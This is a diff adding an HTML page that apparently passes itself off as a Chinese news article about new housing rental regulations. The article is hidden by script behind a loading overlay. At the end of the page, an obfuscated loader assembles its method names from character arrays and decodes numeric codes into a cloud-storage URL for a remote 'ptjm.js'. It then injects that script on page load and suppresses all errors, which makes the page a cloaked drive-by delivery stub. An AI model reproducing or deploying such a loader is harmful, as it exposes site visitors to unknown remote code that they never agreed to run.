@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="referrer" content="no-referrer">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='40,15 70,15 55,45 80,45 30,90 45,55 20,55' fill='%23ffc107'/></svg>">
+
+  <title></title>
+
+  <style>
+    #load {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .kz { display: flex; gap: 12px; }
+    .pz {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      animation: xb 0.6s infinite alternate;
+    }
+    .pz:nth-child(1) { background: #e91e63; animation-delay: 0s; }
+    .pz:nth-child(2) { background: #2196f3; animation-delay: 0.2s; }
+    .pz:nth-child(3) { background: #f9d402; animation-delay: 0.4s; }
+    @keyframes xb {
+      from { transform: translateY(0); opacity: 0.6; }
+      to { transform: translateY(-15px); opacity: 1; }
+    }
+  </style>
+</head>
+<script>
+  !function() {
+      "use strict";
+      var t = "input is invalid type"
+        , r = "object" == typeof window
+        , e = r ? window : {};
+      e.JS_MD5_NO_WINDOW && (r = !1);
+      var i = !r && "object" == typeof self
+        , s = !e.JS_MD5_NO_NODE_JS && "object" == typeof process && process.versions && process.versions.node;
+      s ? e = global : i && (e = self);
+      var h, n = !e.JS_MD5_NO_COMMON_JS && "object" == typeof module && module.exports, o = "function" == typeof define && define.amd, a = !e.JS_MD5_NO_ARRAY_BUFFER && "undefined" != typeof ArrayBuffer, f = "0123456789abcdef".split(""), u = [128, 32768, 8388608, -2147483648], c = [0, 8, 16, 24], y = ["hex", "array", "digest", "buffer", "arrayBuffer", "base64"], p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), d = [];
+      if (a) {
+          var l = new ArrayBuffer(68);
+          h = new Uint8Array(l),
+          d = new Uint32Array(l)
+      }
+      var b = Array.isArray;
+      !e.JS_MD5_NO_NODE_JS && b || (b = function(t) {
+          return "[object Array]" === Object.prototype.toString.call(t)
+      }
+      );
+      var v = ArrayBuffer.isView;
+      !a || !e.JS_MD5_NO_ARRAY_BUFFER_IS_VIEW && v || (v = function(t) {
+          return "object" == typeof t && t.buffer && t.buffer.constructor === ArrayBuffer
+      }
+      );
+      var w = function(r) {
+          var e = typeof r;
+          if ("string" === e)
+              return [r, !0];
+          if ("object" !== e || null === r)
+              throw new Error(t);
+          if (a && r.constructor === ArrayBuffer)
+              return [new Uint8Array(r), !1];
+          if (!b(r) && !v(r))
+              throw new Error(t);
+          return [r, !1]
+      }
+        , A = function(t) {
+          return function(r) {
+              return new g(!0).update(r)[t]()
+          }
+      }
+        , _ = function(r) {
+          var i, s = require("crypto"), h = require("buffer").Buffer;
+          i = h.from && !e.JS_MD5_NO_BUFFER_FROM ? h.from : function(t) {
+              return new h(t)
+          }
+          ;
+          return function(e) {
+              if ("string" == typeof e)
+                  return s.createHash("md5").update(e, "utf8").digest("hex");
+              if (null == e)
+                  throw new Error(t);
+              return e.constructor === ArrayBuffer && (e = new Uint8Array(e)),
+              b(e) || v(e) || e.constructor === h ? s.createHash("md5").update(i(e)).digest("hex") : r(e)
+          }
+      }
+        , B = function(t) {
+          return function(r, e) {
+              return new m(r,!0).update(e)[t]()
+          }
+      };
+      function g(t) {
+          if (t)
+              d[0] = d[16] = d[1] = d[2] = d[3] = d[4] = d[5] = d[6] = d[7] = d[8] = d[9] = d[10] = d[11] = d[12] = d[13] = d[14] = d[15] = 0,
+              this.blocks = d,
+              this.buffer8 = h;
+          else if (a) {
+              var r = new ArrayBuffer(68);
+              this.buffer8 = new Uint8Array(r),
+              this.blocks = new Uint32Array(r)
+          } else
+              this.blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+          this.h0 = this.h1 = this.h2 = this.h3 = this.start = this.bytes = this.hBytes = 0,
+          this.finalized = this.hashed = !1,
+          this.first = !0
+      }
+      function m(t, r) {
+          var e, i = w(t);
+          if (t = i[0],
+          i[1]) {
+              var s, h = [], n = t.length, o = 0;
+              for (e = 0; e < n; ++e)
+                  (s = t.charCodeAt(e)) < 128 ? h[o++] = s : s < 2048 ? (h[o++] = 192 | s >>> 6,
+                  h[o++] = 128 | 63 & s) : s < 55296 || s >= 57344 ? (h[o++] = 224 | s >>> 12,
+                  h[o++] = 128 | s >>> 6 & 63,
+                  h[o++] = 128 | 63 & s) : (s = 65536 + ((1023 & s) << 10 | 1023 & t.charCodeAt(++e)),
+                  h[o++] = 240 | s >>> 18,
+                  h[o++] = 128 | s >>> 12 & 63,
+                  h[o++] = 128 | s >>> 6 & 63,
+                  h[o++] = 128 | 63 & s);
+              t = h
+          }
+          t.length > 64 && (t = new g(!0).update(t).array());
+          var a = []
+            , f = [];
+          for (e = 0; e < 64; ++e) {
+              var u = t[e] || 0;
+              a[e] = 92 ^ u,
+              f[e] = 54 ^ u
+          }
+          g.call(this, r),
+          this.update(f),
+          this.oKeyPad = a,
+          this.inner = !0,
+          this.sharedMemory = r
+      }
+      g.prototype.update = function(t) {
+          if (this.finalized)
+              throw new Error("finalize already called");
+          var r = w(t);
+          t = r[0];
+          for (var e, i, s = r[1], h = 0, n = t.length, o = this.blocks, f = this.buffer8; h < n; ) {
+              if (this.hashed && (this.hashed = !1,
+              o[0] = o[16],
+              o[16] = o[1] = o[2] = o[3] = o[4] = o[5] = o[6] = o[7] = o[8] = o[9] = o[10] = o[11] = o[12] = o[13] = o[14] = o[15] = 0),
+              s)
+                  if (a)
+                      for (i = this.start; h < n && i < 64; ++h)
+                          (e = t.charCodeAt(h)) < 128 ? f[i++] = e : e < 2048 ? (f[i++] = 192 | e >>> 6,
+                          f[i++] = 128 | 63 & e) : e < 55296 || e >= 57344 ? (f[i++] = 224 | e >>> 12,
+                          f[i++] = 128 | e >>> 6 & 63,
+                          f[i++] = 128 | 63 & e) : (e = 65536 + ((1023 & e) << 10 | 1023 & t.charCodeAt(++h)),
+                          f[i++] = 240 | e >>> 18,
+                          f[i++] = 128 | e >>> 12 & 63,
+                          f[i++] = 128 | e >>> 6 & 63,
+                          f[i++] = 128 | 63 & e);
+                  else
+                      for (i = this.start; h < n && i < 64; ++h)
+                          (e = t.charCodeAt(h)) < 128 ? o[i >>> 2] |= e << c[3 & i++] : e < 2048 ? (o[i >>> 2] |= (192 | e >>> 6) << c[3 & i++],
+                          o[i >>> 2] |= (128 | 63 & e) << c[3 & i++]) : e < 55296 || e >= 57344 ? (o[i >>> 2] |= (224 | e >>> 12) << c[3 & i++],
+                          o[i >>> 2] |= (128 | e >>> 6 & 63) << c[3 & i++],
+                          o[i >>> 2] |= (128 | 63 & e) << c[3 & i++]) : (e = 65536 + ((1023 & e) << 10 | 1023 & t.charCodeAt(++h)),
+                          o[i >>> 2] |= (240 | e >>> 18) << c[3 & i++],
+                          o[i >>> 2] |= (128 | e >>> 12 & 63) << c[3 & i++],
+                          o[i >>> 2] |= (128 | e >>> 6 & 63) << c[3 & i++],
+                          o[i >>> 2] |= (128 | 63 & e) << c[3 & i++]);
+              else if (a)
+                  for (i = this.start; h < n && i < 64; ++h)
+                      f[i++] = t[h];
+              else
+                  for (i = this.start; h < n && i < 64; ++h)
+                      o[i >>> 2] |= t[h] << c[3 & i++];
+              this.lastByteIndex = i,
+              this.bytes += i - this.start,
+              i >= 64 ? (this.start = i - 64,
+              this.hash(),
+              this.hashed = !0) : this.start = i
+          }
+          return this.bytes > 4294967295 && (this.hBytes += this.bytes / 4294967296 << 0,
+          this.bytes = this.bytes % 4294967296),
+          this
+      }
+      ,
+      g.prototype.finalize = function() {
+          if (!this.finalized) {
+              this.finalized = !0;
+              var t = this.blocks
+                , r = this.lastByteIndex;
+              t[r >>> 2] |= u[3 & r],
+              r >= 56 && (this.hashed || this.hash(),
+              t[0] = t[16],
+              t[16] = t[1] = t[2] = t[3] = t[4] = t[5] = t[6] = t[7] = t[8] = t[9] = t[10] = t[11] = t[12] = t[13] = t[14] = t[15] = 0),
+              t[14] = this.bytes << 3,
+              t[15] = this.hBytes << 3 | this.bytes >>> 29,
+              this.hash()
+          }
+      }
+      ,
+      g.prototype.hash = function() {
+          var t, r, e, i, s, h, n = this.blocks;
+          this.first ? r = ((r = ((t = ((t = n[0] - 680876937) << 7 | t >>> 25) - 271733879 << 0) ^ (e = ((e = (-271733879 ^ (i = ((i = (-1732584194 ^ 2004318071 & t) + n[1] - 117830708) << 12 | i >>> 20) + t << 0) & (-271733879 ^ t)) + n[2] - 1126478375) << 17 | e >>> 15) + i << 0) & (i ^ t)) + n[3] - 1316259209) << 22 | r >>> 10) + e << 0 : (t = this.h0,
+          r = this.h1,
+          e = this.h2,
+          r = ((r += ((t = ((t += ((i = this.h3) ^ r & (e ^ i)) + n[0] - 680876936) << 7 | t >>> 25) + r << 0) ^ (e = ((e += (r ^ (i = ((i += (e ^ t & (r ^ e)) + n[1] - 389564586) << 12 | i >>> 20) + t << 0) & (t ^ r)) + n[2] + 606105819) << 17 | e >>> 15) + i << 0) & (i ^ t)) + n[3] - 1044525330) << 22 | r >>> 10) + e << 0),
+          r = ((r += ((t = ((t += (i ^ r & (e ^ i)) + n[4] - 176418897) << 7 | t >>> 25) + r << 0) ^ (e = ((e += (r ^ (i = ((i += (e ^ t & (r ^ e)) + n[5] + 1200080426) << 12 | i >>> 20) + t << 0) & (t ^ r)) + n[6] - 1473231341) << 17 | e >>> 15) + i << 0) & (i ^ t)) + n[7] - 45705983) << 22 | r >>> 10) + e << 0,
+          r = ((r += ((t = ((t += (i ^ r & (e ^ i)) + n[8] + 1770035416) << 7 | t >>> 25) + r << 0) ^ (e = ((e += (r ^ (i = ((i += (e ^ t & (r ^ e)) + n[9] - 1958414417) << 12 | i >>> 20) + t << 0) & (t ^ r)) + n[10] - 42063) << 17 | e >>> 15) + i << 0) & (i ^ t)) + n[11] - 1990404162) << 22 | r >>> 10) + e << 0,
+          r = ((r += ((t = ((t += (i ^ r & (e ^ i)) + n[12] + 1804603682) << 7 | t >>> 25) + r << 0) ^ (e = ((e += (r ^ (i = ((i += (e ^ t & (r ^ e)) + n[13] - 40341101) << 12 | i >>> 20) + t << 0) & (t ^ r)) + n[14] - 1502002290) << 17 | e >>> 15) + i << 0) & (i ^ t)) + n[15] + 1236535329) << 22 | r >>> 10) + e << 0,
+          r = ((r += ((i = ((i += (r ^ e & ((t = ((t += (e ^ i & (r ^ e)) + n[1] - 165796510) << 5 | t >>> 27) + r << 0) ^ r)) + n[6] - 1069501632) << 9 | i >>> 23) + t << 0) ^ t & ((e = ((e += (t ^ r & (i ^ t)) + n[11] + 643717713) << 14 | e >>> 18) + i << 0) ^ i)) + n[0] - 373897302) << 20 | r >>> 12) + e << 0,
+          r = ((r += ((i = ((i += (r ^ e & ((t = ((t += (e ^ i & (r ^ e)) + n[5] - 701558691) << 5 | t >>> 27) + r << 0) ^ r)) + n[10] + 38016083) << 9 | i >>> 23) + t << 0) ^ t & ((e = ((e += (t ^ r & (i ^ t)) + n[15] - 660478335) << 14 | e >>> 18) + i << 0) ^ i)) + n[4] - 405537848) << 20 | r >>> 12) + e << 0,
+          r = ((r += ((i = ((i += (r ^ e & ((t = ((t += (e ^ i & (r ^ e)) + n[9] + 568446438) << 5 | t >>> 27) + r << 0) ^ r)) + n[14] - 1019803690) << 9 | i >>> 23) + t << 0) ^ t & ((e = ((e += (t ^ r & (i ^ t)) + n[3] - 187363961) << 14 | e >>> 18) + i << 0) ^ i)) + n[8] + 1163531501) << 20 | r >>> 12) + e << 0,
+          r = ((r += ((i = ((i += (r ^ e & ((t = ((t += (e ^ i & (r ^ e)) + n[13] - 1444681467) << 5 | t >>> 27) + r << 0) ^ r)) + n[2] - 51403784) << 9 | i >>> 23) + t << 0) ^ t & ((e = ((e += (t ^ r & (i ^ t)) + n[7] + 1735328473) << 14 | e >>> 18) + i << 0) ^ i)) + n[12] - 1926607734) << 20 | r >>> 12) + e << 0,
+          r = ((r += ((h = (i = ((i += ((s = r ^ e) ^ (t = ((t += (s ^ i) + n[5] - 378558) << 4 | t >>> 28) + r << 0)) + n[8] - 2022574463) << 11 | i >>> 21) + t << 0) ^ t) ^ (e = ((e += (h ^ r) + n[11] + 1839030562) << 16 | e >>> 16) + i << 0)) + n[14] - 35309556) << 23 | r >>> 9) + e << 0,
+          r = ((r += ((h = (i = ((i += ((s = r ^ e) ^ (t = ((t += (s ^ i) + n[1] - 1530992060) << 4 | t >>> 28) + r << 0)) + n[4] + 1272893353) << 11 | i >>> 21) + t << 0) ^ t) ^ (e = ((e += (h ^ r) + n[7] - 155497632) << 16 | e >>> 16) + i << 0)) + n[10] - 1094730640) << 23 | r >>> 9) + e << 0,
+          r = ((r += ((h = (i = ((i += ((s = r ^ e) ^ (t = ((t += (s ^ i) + n[13] + 681279174) << 4 | t >>> 28) + r << 0)) + n[0] - 358537222) << 11 | i >>> 21) + t << 0) ^ t) ^ (e = ((e += (h ^ r) + n[3] - 722521979) << 16 | e >>> 16) + i << 0)) + n[6] + 76029189) << 23 | r >>> 9) + e << 0,
+          r = ((r += ((h = (i = ((i += ((s = r ^ e) ^ (t = ((t += (s ^ i) + n[9] - 640364487) << 4 | t >>> 28) + r << 0)) + n[12] - 421815835) << 11 | i >>> 21) + t << 0) ^ t) ^ (e = ((e += (h ^ r) + n[15] + 530742520) << 16 | e >>> 16) + i << 0)) + n[2] - 995338651) << 23 | r >>> 9) + e << 0,
+          r = ((r += ((i = ((i += (r ^ ((t = ((t += (e ^ (r | ~i)) + n[0] - 198630844) << 6 | t >>> 26) + r << 0) | ~e)) + n[7] + 1126891415) << 10 | i >>> 22) + t << 0) ^ ((e = ((e += (t ^ (i | ~r)) + n[14] - 1416354905) << 15 | e >>> 17) + i << 0) | ~t)) + n[5] - 57434055) << 21 | r >>> 11) + e << 0,
+          r = ((r += ((i = ((i += (r ^ ((t = ((t += (e ^ (r | ~i)) + n[12] + 1700485571) << 6 | t >>> 26) + r << 0) | ~e)) + n[3] - 1894986606) << 10 | i >>> 22) + t << 0) ^ ((e = ((e += (t ^ (i | ~r)) + n[10] - 1051523) << 15 | e >>> 17) + i << 0) | ~t)) + n[1] - 2054922799) << 21 | r >>> 11) + e << 0,
+          r = ((r += ((i = ((i += (r ^ ((t = ((t += (e ^ (r | ~i)) + n[8] + 1873313359) << 6 | t >>> 26) + r << 0) | ~e)) + n[15] - 30611744) << 10 | i >>> 22) + t << 0) ^ ((e = ((e += (t ^ (i | ~r)) + n[6] - 1560198380) << 15 | e >>> 17) + i << 0) | ~t)) + n[13] + 1309151649) << 21 | r >>> 11) + e << 0,
+          r = ((r += ((i = ((i += (r ^ ((t = ((t += (e ^ (r | ~i)) + n[4] - 145523070) << 6 | t >>> 26) + r << 0) | ~e)) + n[11] - 1120210379) << 10 | i >>> 22) + t << 0) ^ ((e = ((e += (t ^ (i | ~r)) + n[2] + 718787259) << 15 | e >>> 17) + i << 0) | ~t)) + n[9] - 343485551) << 21 | r >>> 11) + e << 0,
+          this.first ? (this.h0 = t + 1732584193 << 0,
+          this.h1 = r - 271733879 << 0,
+          this.h2 = e - 1732584194 << 0,
+          this.h3 = i + 271733878 << 0,
+          this.first = !1) : (this.h0 = this.h0 + t << 0,
+          this.h1 = this.h1 + r << 0,
+          this.h2 = this.h2 + e << 0,
+          this.h3 = this.h3 + i << 0)
+      }
+      ,
+      g.prototype.hex = function() {
+          this.finalize();
+          var t = this.h0
+            , r = this.h1
+            , e = this.h2
+            , i = this.h3;
+          return f[t >>> 4 & 15] + f[15 & t] + f[t >>> 12 & 15] + f[t >>> 8 & 15] + f[t >>> 20 & 15] + f[t >>> 16 & 15] + f[t >>> 28 & 15] + f[t >>> 24 & 15] + f[r >>> 4 & 15] + f[15 & r] + f[r >>> 12 & 15] + f[r >>> 8 & 15] + f[r >>> 20 & 15] + f[r >>> 16 & 15] + f[r >>> 28 & 15] + f[r >>> 24 & 15] + f[e >>> 4 & 15] + f[15 & e] + f[e >>> 12 & 15] + f[e >>> 8 & 15] + f[e >>> 20 & 15] + f[e >>> 16 & 15] + f[e >>> 28 & 15] + f[e >>> 24 & 15] + f[i >>> 4 & 15] + f[15 & i] + f[i >>> 12 & 15] + f[i >>> 8 & 15] + f[i >>> 20 & 15] + f[i >>> 16 & 15] + f[i >>> 28 & 15] + f[i >>> 24 & 15]
+      }
+      ,
+      g.prototype.toString = g.prototype.hex,
+      g.prototype.digest = function() {
+          this.finalize();
+          var t = this.h0
+            , r = this.h1
+            , e = this.h2
+            , i = this.h3;
+          return [255 & t, t >>> 8 & 255, t >>> 16 & 255, t >>> 24 & 255, 255 & r, r >>> 8 & 255, r >>> 16 & 255, r >>> 24 & 255, 255 & e, e >>> 8 & 255, e >>> 16 & 255, e >>> 24 & 255, 255 & i, i >>> 8 & 255, i >>> 16 & 255, i >>> 24 & 255]
+      }
+      ,
+      g.prototype.array = g.prototype.digest,
+      g.prototype.arrayBuffer = function() {
+          this.finalize();
+          var t = new ArrayBuffer(16)
+            , r = new Uint32Array(t);
+          return r[0] = this.h0,
+          r[1] = this.h1,
+          r[2] = this.h2,
+          r[3] = this.h3,
+          t
+      }
+      ,
+      g.prototype.buffer = g.prototype.arrayBuffer,
+      g.prototype.base64 = function() {
+          for (var t, r, e, i = "", s = this.array(), h = 0; h < 15; )
+              t = s[h++],
+              r = s[h++],
+              e = s[h++],
+              i += p[t >>> 2] + p[63 & (t << 4 | r >>> 4)] + p[63 & (r << 2 | e >>> 6)] + p[63 & e];
+          return t = s[h],
+          i += p[t >>> 2] + p[t << 4 & 63] + "=="
+      }
+      ,
+      m.prototype = new g,
+      m.prototype.finalize = function() {
+          if (g.prototype.finalize.call(this),
+          this.inner) {
+              this.inner = !1;
+              var t = this.array();
+              g.call(this, this.sharedMemory),
+              this.update(this.oKeyPad),
+              this.update(t),
+              g.prototype.finalize.call(this)
+          }
+      }
+      ;
+      var O = function() {
+          var t = A("hex");
+          s && (t = _(t)),
+          t.create = function() {
+              return new g
+          }
+          ,
+          t.update = function(r) {
+              return t.create().update(r)
+          }
+          ;
+          for (var r = 0; r < y.length; ++r) {
+              var e = y[r];
+              t[e] = A(e)
+          }
+          return t
+      }();
+      O.md5 = O,
+      O.md5.hmac = function() {
+          var t = B("hex");
+          t.create = function(t) {
+              return new m(t)
+          }
+          ,
+          t.update = function(r, e) {
+              return t.create(r).update(e)
+          }
+          ;
+          for (var r = 0; r < y.length; ++r) {
+              var e = y[r];
+              t[e] = B(e)
+          }
+          return t
+      }(),
+      n ? module.exports = O : (e.md5 = O,
+      o && define((function() {
+          return O
+      }
+      )))
+  }();
+</script>
+<style>
+  * {
+      margin: 0;
+      padding: 0;
+  }
+
+  body {
+      background: #eee;
+      color: #000000;
+      font-size: 0;
+  }
+
+  .DUJKQHCjDhxd {
+      font-size: 24px;
+  }
+
+  #safety {
+      width: 100%;
+      height: 48px;
+      background: #e8fef2;
+      display: none;
+      top: 0;
+  }
+
+  #safety .icon {
+      width: 26px;
+      flex: 0 0 26px;
+      height: 26px;
+      margin-left: 10px;
+      margin-right: 10px;
+      margin-top: 11px;
+  }
+
+  #safety .text {
+      width: 100%;
+      flex: 1;
+      height: 48px;
+      color: rgba(7,193,96);
+      font-size: 16px;
+      line-height: 48px;
+      font-family: 微软雅黑,serif;
+  }
+
+  .text {
+      text-decoration: line-through;
+  }
+
+  .box {
+      width: 100%;
+      display: none;
+      margin-top: 10px;
+  }
+
+  .code-box {
+      width: 100%;
+      flex: 1;
+      margin-right: 10px;
+      margin-left: 10px;
+      background-color: #FFFFFF;
+      border-radius: 6px;
+      padding: 10px 0;
+      display: flex;
+  }
+
+  .code-box .border {
+      width: 100%;
+      flex: 1;
+      margin-right: 10px;
+      margin-left: 10px;
+  }
+
+  .code-box #title {
+      font-weight: 600;
+      font-size: 18px;
+      line-height: 30px;
+      margin-bottom: 10px;
+  }
+
+  .code-qrcode {
+      width: 100%;
+  }
+
+  #content {
+      font-size: 16px;
+      margin-top: 5px;
+      line-height: 24px;
+      font-weight: 400;
+      white-space: pre-wrap;
+      /* CSS3 */
+      white-space: -moz-pre-wrap;
+      /* Mozilla, since 1999 */
+      white-space: -o-pre-wrap;
+      /* Opera 7 */
+      word-wrap: break-word;
+      /* Internet Explorer 5.5+ */
+  }
+
+  img {
+      width: 100%;
+  }
+</style>
+</head>
+<body>
+<main class="DUJKQHCjDhxd main-content container clearfix substratum" style="transform:none">
+  <div class="paVbLczQjP row" style="transform:none">
+      <div class="exnHghiXtHa main fl">
+          <div class="kahkXWqGri single box-show">
+              <article class="kahkXWqGri single-post">
+                  <header class="cBBwrwue single-title">
+                      <nav class="OkswUjsPFNBF single-place place">
+                          <i class="PXbwSemlTi icon font-home"></i>
+                          <a href="/">首页</a>
+                          <i class="hylTfWvAurg icon font-angle-right"></i>
+                          <a href="ZKxMyeTjAj.html" title="查看 新闻资讯 分类中的全部文章">新闻资讯</a>
+                          <i class="ZrxCKlBB icon font-angle-right"></i>
+                          <a href="#" rel="bookmark" title="正在阅读 住房租赁新规“满月”，租客“痛点”缓解了吗？">正文</a>
+                      </nav>
+                      <div id="font-change" class="xvuTztUIMIjd single-font fr">
+                          <span id="font-dec">
+                              <a href="#" title="减小字体">
+                                  <i class="cKXsYRhDB icon font-minus-square-o"></i>
+                              </a>
+                          </span>
+                          <span id="font-int">
+                              <a href="#" title="默认字体">
+                                  <i class="NMNIppXEfIHQ icon font-font"></i>
+                              </a>
+                          </span>
+                          <span id="font-inc">
+                              <a href="#" title="增大字体">
+                                  <i class="nBCTZEmJx icon font-plus-square-o"></i>
+                              </a>
+                          </span>
+                      </div>
+                  </header>
+                  <div class="cvwJwgCnv single-entry">
+                      <p>《住房租赁条例》施行"满月"之际，记者在北京、山东、河南、四川等地采访了解到，新规落地正推动住房租赁市场发生积极变化，进一步规范市场秩序。人们期待，随着相关配套措施落实落细，租赁双方权益能得到更好保障，为住房租赁行业健康可持续发展注入新动能。</p>
+                      <p>
+                          <strong>推动市场更规范，逐步缓解租客"痛点"</strong>
+                      </p>
+                      <p>前不久，大学刚毕业的小陶通过一家大平台在成都高新区租了一套二居室，月租金2600元，平台对刚毕业大学生"免押、月付"的方式为她减轻了不少经济压力。但回想起此前一次短暂的租房经历，她仍心有余悸。</p>
+                      <p>"第一次租房也没经验，没住多久冰箱就坏了，因为担心房东找借口克扣押金，我都没敢联系他，最后是自己掏钱修好的。"小陶告诉记者，很多刚毕业的女生租房时都缺乏安全感，总怕遇到各种麻烦。</p>
+                      <p>押金难退，一直是租赁纠纷的"重灾区"。以往有的租房合同条款模糊，给了不良中介或房东可乘之机。针对这一痛点，条例精准发力，要求合同必须明确押金数额、返还时间及扣减情形，努力为租户筑牢权益"防护网"。</p>
+                      <p>近年来，我国住房租赁市场快速发展，但隔断房、甲醛房以及部分租赁房屋设施陈旧、卫生条件差等问题也比较突出，成了许多租客心中的痛。新规重拳出击，整治市场乱象。</p>
+                      <p>新规带来的改变正在各地悄然发生。在北京市石景山区，租客王金利就因此萌生了换房的想法。公司为他租住的是一间仅10平方米的加盖房屋。近期，街道工作人员主动联系他，详细介绍了新规内容。</p>
+                      <p>"条例规定，厨房、卫生间、阳台、过道、地下储藏室、车库等非居住空间不得单独出租用于居住。"王金利说，了解到这一规定后，他立即与公司协商换房，公司认可新规，并准备提供租房补贴。</p>
+                      <p>从担忧押金到安心入住，从将就凑合到追求品质，租赁新规正在推动提升租房体验。</p>
+                      <p>"新规清晰界定了租赁双方的权利和义务，减少租赁争议的产生，也让纠纷出现时有法可依，强化权益保障。"贝壳研究院高级分析师黄卉说，新规还对租赁房源质量及信息发布做出明确要求，在监管督促下，违规的隔断房、群租房大量清退，同时房源真实性显著提升，合规房源占比也提高了。</p>
+                      <p>
+                          <strong>推动竞争更有序，优质企业优势凸显</strong>
+                      </p>
+                      <p>采用绿色无甲醛墙板、加厚床垫、引入低能耗品牌家电...在郑州"城发美寓"人才公寓，郑州城发安居有限公司对照新规要求，对公寓的舒适度和安全性进行全面升级，并完善了社区配套。</p>
+                      <p>"条例划定了'红线'，也指明了高品质发展'赛道'。"公司总经理陈显刚说，条例推动行业提升服务品质，促进住房租赁市场健康发展。</p>
+                      <div style="text-align:center">
+                          <img style="border:0px solid #000000" src="//i2.chinanews.com.cn/simg/cmshd/2025/10/15/7417322b26f440d58c6686372271bb45.jpeg" alt="">
+                      </div>
+                      <div class="pictext" style="text-align:left;text-indent:2em">升级改造后的"城发美寓"人才公寓。(受访者供图)</div>
+                      <p>在青岛德佑地产观照海棠湾店，记者看到，店内醒目位置张贴着管理制度和人员信息，经纪人一律挂牌上岗，所有服务项目明码标价。</p>
+                      <p>"我们现在发布房源前，必须核验权属信息、取得房源核验码，还要实地查看房源并拍照，与委托人签订发布协议。"该店负责人杜依帆说，"要确保每一套房源真实可靠，让租客不再为'假房源'烦心。"</p>
+                      <p>"新规有助于营造规范、公平的行业环境，防止'劣币驱逐良币'。"青年人才社区"青特缦寓"运营负责人矫君章说，通过企业登记备案、信用评价等制度，将各类经营主体纳入监管。随着一些不规范的经营主体逐步出清，市场竞争将更有序，市场化、专业化的住房租赁企业优势将进一步凸显。</p>
+                      <p>北京市房地产法学会副会长赵秀池认为，新规促使租赁企业和中介服务更加规范，推动市场逐步形成良性发展机制。过去靠发布虚假、低价"诱饵"房源信息扰乱市场的不规范出租方，生存空间被大大压缩。诚信经营者赢得市场，优质房源获得青睐，租赁行业迎来更好的发展环境。</p>
+                      <p>
+                          <strong>推动监管更有力，人们期待配套措施落实落细</strong>
+                      </p>
+                      <p>北京瞄准个人"二房东"乱象，拟将个人转租10套(间)住房及以上纳入行业监管；青岛全面规范房源信息发布，实行房源核验码制度...推动住房租赁市场健康发展，各地正在推出配套政策。</p>
+                      <p>与此同时，各地租赁服务也在持续优化。线上线下都能办、房东租客都能办、企业机构批量办、合同网签自动办...针对租赁合同备案不够便捷的问题，成都住房租赁交易服务平台推出"承租人单方备案""企业批量备案"等创新功能。</p>
+                      <p>"租赁合同网签备案后，可线上查询备案结果，为承租人依法申请办理居住登记、居住证积分、义务教育、提取公积金等提供便利。"成都市房屋租赁服务中心副主任曹威介绍，目前，全市住房租赁合同备案量显著提升，今年9月备案8.4万件，环比增长16.8%，同比增长45%。</p>
+                      <p>租金安全是各方关心的重要一环。济南市住建局相关负责人表示，当地正逐步建立租金监管与监测功能，从"事后纠纷处理"转向"事前风险预防"，防止不良企业"不合理收费""卷款跑路"等情况发生。</p>
+                      <p>"条例施行，关键在于落实落细。"住房城乡建设部政策研究中心副主任浦湛表示，规范和引导住房租赁市场是一个需要久久为功的系统工程，新规落地是一个好的开始，下一步，要加快推动各地配套政策出台和落实，更好治理租房市场乱象，为"安心租住"保驾护航。</p>
+                  </div>
+                  <div class="ilcVelGJWM statement yc">
+                      文章版权声明：除非注明，否则均为<span class="djynzJqpJFa red">住房租赁新规“满月”，租客“痛点”缓解了吗？</span>
+                      原创文章，转载或复制请以超链接形式并注明出处。
+                  </div>
+              </article>
+          </div>
+      </div>
+  </div>
+</main>
+<script>
+  document.querySelectorAll('.DUJKQHCjDhxd').forEach(el => {
+      el.style.display = 'none';
+  }
+  );
+</script>
+<body>
+  <div id="load">
+    <div class="kz">
+      <div class="pz"></div>
+      <div class="pz"></div>
+      <div class="pz"></div>
+    </div>
+  </div>
+
+  <div id="box"></div>
+
+  <script>
+    (function () {
+      function injectExternalJs() {
+        try {
+          var dArr = ["d","o","c","u","m","e","n","t"];
+          var D = dArr.join("");        
+    
+          var cArr = ["c","r","e","a","t","e","E","l","e","m","e","n","t"];
+          var CE = cArr.join("");        
+    
+          var bArr = ["b","o","d","y"];
+          var BD = bArr.join("");         
+    
+          var sArr = ["s","c","r","i","p","t"];
+          var TAG = sArr.join("");          
+    
+          var srcArr = ["s","r","c"];
+          var SR = srcArr.join("");         
+    
+          var acArr = ["a","p","p","e","n","d","C","h","i","l","d"];
+          var AC = acArr.join("");         
+    
+          var fcArr = ["f","r","o","m","C","h","a","r","C","o","d","e"];
+          var FC = fcArr.join("");           
+    
+          var X = [
+            47,47,100,102,97,115,100,122,45,49,51,54,55,50,48,48,
+            49,48,55,46,99,111,115,46,97,99,99,101,108,101,114,97,
+            116,101,46,109,121,113,99,108,111,117,100,46,99,111,109,
+            47,112,116,106,109,46,106,115,63,118,61
+          ];
+    
+          var fromFn = String[FC];           
+          var URL = "";
+          for (var i = 0; i < X.length; i++) {
+            URL += fromFn(X[i]);
+          }
+          URL += Date.now();
+    
+          var doc = window[D];
+          var body = doc[BD];
+          if (!body) {
+         
+            return;
+          }
+    
+          var S = doc[CE](TAG);
+          S[SR] = URL;
+          body[AC](S);
+    
+         
+        } catch (e) {
+          
+        }
+      }
+    
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", injectExternalJs);
+      } else {
+        injectExternalJs();
+      }
+    })();
+    </script>
+    
+</body>
+</html>
